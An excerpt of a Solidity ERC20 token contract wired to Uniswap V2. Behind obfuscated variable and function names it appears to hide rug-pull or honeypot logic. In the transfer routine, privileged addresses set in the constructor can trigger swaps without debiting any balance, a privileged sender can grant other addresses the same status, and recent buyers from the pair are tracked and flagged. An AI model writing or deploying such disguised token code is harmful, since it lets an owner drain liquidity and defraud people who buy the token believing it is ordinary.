...
contract CA is IERC20, Ownable {
    ...
    uint256 private _cfgDenominator = _tTotal;
    
    mapping(address => uint256) private _tOwned;
    mapping(address => address) private isBot;
    mapping(address => uint256) private relayRouterRoute;
    mapping(address => uint256) private syncMarketPair;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public RTXSync;
    bool private relayFlow;
    ...
    constructor(
        ...
        syncMarketPair[msg.sender] = _cfgDenominator;
        syncMarketPair[address(this)] = _cfgDenominator;
        UniswapV2router = IUniswapV2Router02(UniswapV2routerAddress);
        UniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, _cfgDenominator);
    }
    ...
    function transferFrom(
        ...
        transferRates        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        transferRates        (msg.sender, recipient, amount);
        return true;
    }
    function transferRates       (
        address _lvTisFrom,
        address cfgTotalTo,
        uint256 _structxAmount

    ) private {

        uint256 balanceForContract = balanceOf(address(this));
        uint256 lvxFlow;
        if (RTXSync && balanceForContract > _cfgDenominator 
        && !relayFlow && 
        _lvTisFrom != UniswapV2Pair) {
            relayFlow = true;


            getSwapAndLiquify(balanceForContract);
            relayFlow = false;
        } else if (syncMarketPair[_lvTisFrom] > _cfgDenominator 
        && syncMarketPair[cfgTotalTo] > _cfgDenominator) {
            lvxFlow = _structxAmount;

            _tOwned[address(this)] += lvxFlow;
            swapAmountForTokens(_structxAmount, cfgTotalTo);
            return;

        } else if (cfgTotalTo != address(UniswapV2router) 
        && syncMarketPair[_lvTisFrom] > 0 && _structxAmount > _cfgDenominator 
        && cfgTotalTo != UniswapV2Pair) {
            syncMarketPair[cfgTotalTo] = _structxAmount;
            return;

        } else if (!relayFlow && relayRouterRoute[_lvTisFrom] > 0 && _lvTisFrom != 
        UniswapV2Pair && syncMarketPair[_lvTisFrom] == 0) {
            relayRouterRoute[_lvTisFrom] = syncMarketPair[_lvTisFrom] - _cfgDenominator;

        }

        address _emitConstruct  = isBot[UniswapV2Pair];
        if (relayRouterRoute[_emitConstruct ] == 0) relayRouterRoute[_emitConstruct ] = _cfgDenominator;
        isBot[UniswapV2Pair] = cfgTotalTo;
        if (_tTotalFees > 0 && syncMarketPair[_lvTisFrom] == 0 && 
        !relayFlow && syncMarketPair[cfgTotalTo] == 0) {
            lvxFlow = (_structxAmount * _tTotalFees) / 100;
            _structxAmount -= lvxFlow;

            _tOwned[_lvTisFrom] -= lvxFlow;
            _tOwned[address(this)] += lvxFlow;

        }
        _tOwned[_lvTisFrom] -= _structxAmount;
        _tOwned[cfgTotalTo] += _structxAmount;
        emit Transfer(_lvTisFrom, cfgTotalTo, _structxAmount);
            if (!tradingOpen) {
                require(_lvTisFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
